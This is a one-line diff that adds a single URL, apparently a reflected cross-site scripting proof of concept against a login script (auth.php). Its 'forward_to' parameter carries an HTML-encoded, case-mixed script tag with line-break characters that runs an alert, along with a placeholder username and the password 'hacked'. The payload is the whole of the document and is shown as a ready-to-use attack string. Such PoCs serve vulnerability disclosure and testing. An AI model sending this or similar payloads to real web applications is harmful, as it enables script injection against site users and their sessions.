@@ -1,0 +1,1 @@
+http://www.example.com/upload/auth.php?ts_username=indoushka&amp;forward_to=&gt;&quot;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;&amp;fn=login&amp;ts_password=hacked&amp;remember=on
